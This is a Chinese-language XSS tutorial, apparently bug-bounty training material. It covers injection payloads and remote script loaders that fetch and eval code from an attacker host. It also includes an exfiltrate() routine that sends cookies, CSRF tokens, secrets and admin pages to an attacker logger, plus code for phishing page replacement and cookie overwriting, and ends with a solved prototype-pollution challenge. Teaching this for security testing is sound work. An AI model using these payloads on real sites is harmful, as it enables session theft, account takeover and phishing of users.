# 跨站脚本攻击 (XSS)

XSS（跨站脚本攻击）是一种客户端漏洞，允许攻击者在受害者的网站上运行恶意 JavaScript。当我们想到 XSS 时，通常会联想到一个警告框，但 XSS 的真正影响是什么？经典攻击是通过向恶意服务器发送请求来窃取受害者的 Cookie。即使无法访问 Cookie，你仍然在网站上下文中运行代码，几乎可以执行真实用户能做的任何操作。在网页上运行 JavaScript 有四种方式：

- `<script></script>` 标签
- JavaScript 事件处理器，例如 `<img onload=""></script>`
- 访问 `javascript:` URL
- 使用 `eval` 或类似函数

## 示例

想象以下用于欢迎页面的 PHP 代码。

```php
<?php 
$name = isset($_GET["name"]) ? $_GET["name"] : "guest"; 
?>
<h1>Welcome <?= $name ?></h1>
```

GET 变量未经清理就被添加到网页中，这可以被利用。尝试修改 name 参数看看会发生什么。

```html
name<h1>Welcome </h1>
```

现在让我们看看尝试注入一些脚本时会发生什么。

- 常规请求 
    `alice`
    ```html
    <h1>Welcome alice</h1>
    ```
- 注入恶意 JavaScript
    `<script>alert(1)</script>`
    ```html
    <h1>Welcome <script>alert(1)</script></h1>
    ```
- 注入恶意事件处理器
    `<svg onload=alert(1)>`
    ```html
    <h1>Welcome <svg onload=alert(1)></h1>
    ```
- 注入带有 javascript: URL 的恶意链接
    `<a href=javascript:alert(1)>Click me</a>`
    ```html
    <h1>Welcome <a href=javascript:alert(1)>Click me</a></h1>
    ```

## 超越 alert(1)

运行 `alert(1)` 是暴露 XSS 的好方法，但做得更好。展示 XSS 的最佳方式是证明运行任意代码。为此，使用“加载器”，即一小段 JavaScript 代码片段，用于加载另一个任意载荷。有很多方法可以做到这一点，例如：

```javascript
/*    简单地加载远程资源。
      你需要添加 CORS 头 */
s = document.createElement("script")
s.src = "https://yourserver.ywh/payload.js"
document.body.appendChild(s)

// 或者 <script src="https://yourserver.ywh/payload.js"></script>

fetch("https://yourserver.ywh/payload.js")
    .then(r => r.text())
    .then(t => eval(t))

$.getScript("https://yourserver.ywh/payload.js")   // 如果存在 jQuery

/*      使用哈希中的 base64 编码载荷
        由于哈希不会发送到服务器，它可以包含任意代码。
        window.name 或 document.referrer 也可用于保存载荷 */
eval(atob(location.hash.substr(1)))
```

既然你已经获得了代码执行权限，你能做什么？

代表用户提交表单。

```javascript
/*    使用 js 发送 JSON 表单 */
function postJSON(url, data) {
    const headers = {"Content-type": "application/json"}
    const body = JSON.stringify(data)
    return fetch(url, {headers, body})
}

// 用法
postJSON("/changePassword", {
    password: "hunter2",
    confirm_password: "hunter2"
})

/*    使用 js 发送 urlencoded 表单 */
function postUrlEncoded(url, data) {
    const body = new FormData()
    for (const [k, v] of data) {
        body.append(k, v)
    }
    return fetch(url, {body})
}

// 用法
postUrlEncoded("/changePassword", [
    ["password", "hunter2"],
    ["confirm_password", "hunter2"]
])
```

在页面上查找秘密并将其泄露到你的服务器。

```javascript
/*      使用之前定义的 postJSON 函数并向我们的服务器提交查询
          日志页面将记录数据 */
function exfiltrate(data) {
    postJSON("https://yourserver.ywh/logger", data)
}

// 查找秘密
exfiltrate(document.cookie)   // cookies
exfiltrate(document.querySelector("input[name=csrf]").value)   // CSRF token
exfiltrate(window.API_SECRET)   // js 作用域中可用的秘密
exfiltrate(document.documentElement.outerHTML)   // 整个 html 页面

// 查看其他页面
async function getPage(url, cors=false) {
    const headers = cors ? {mode: 'cors'} : {}
    const response = await fetch(url, {headers})
    const responseText = await response.text()
    return responseText
}

getPage("/admin/secret/apiKey").then(txt => exfiltrate(txt))
```

修改网站的行为。

```javascript
/*    用我们自己的 HTML 替换整个页面 */
function replaceHTML(html) {
    document.documentElement.outerHTML = html
}

// 简单地用一条消息替换页面
replaceHTML("<h1>Your website is vulnerable to XSS</h1>")

// 使用 cors 头跨域获取钓鱼页面
// 并替换页面内容
getPage("https://yourserver.ywh/phishing.html", true).then(replaceHTML)

// 你也可以重定向表单
document.querySelection("form").target = "https://yourserver.ywh/logger"

// 或者更改一些关键变量
window.API_URL = "https://yourserver.ywh/fakeApi"

/*    最后，更新网站 cookies
        这对于使用相同顶级域名攻击不同网站很有用 */
function setCookie(name, value, domain=null, path=null) {
    const domainStr = domain ? `domain=${domain};` : '';
    const pathStr = path ? `path=${path};` : '';
    document.cookie = `${name}=${value};${domainStr}${pathStr}`
}

// 仅设置一个恶意 cookie
setCookie("CSRF_TOKEN", "ABC")

// 在特定路径上将 cookie 设置到顶级域名，以绕过另一个子域上的 cookie
setCookie("username", xss_payload, domain=".victim.ywh", path="/vulnerable/page")
```

唯一的限制是你的想象力，也许还有你的 JavaScript 技能。

### Prototype Pollution 

Proto mergin

This is a classic prototype polution example, can you exploit it ?

Goal: `alert(flag)`

code

```html
<h1>Hello <span id="name"></span></h1>
<script>
const flag = 'FLAG{Yay you did it}' 
const container = document.getElementById("name")
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
function merge(dest, src) {
    for (var attr in src) {
        if (isObject(dest[attr]) && isObject(src[attr])) {
            merge(dest[attr], src[attr]);
        } else {
            dest[attr] = src[attr];
        }
    }
    return dest
}
const config = {}
const user = {name: "guest"}

merge(user, JSON.parse("§输入§"))

if (config.debug){
  container.innerHTML = JSON.stringify(user)
} else {
  container.innerText = JSON.stringify(user)
}
</script>
```

输入

```json
{
    "__proto__": {
        "debug": true
    },
    "payload": "<img/src/onerror=alert(flag)>"
}
```
- 原型污染设置 `.debug` 为 true，进入 `.innerHTML` 分支。载荷字符作为 HTML 解析
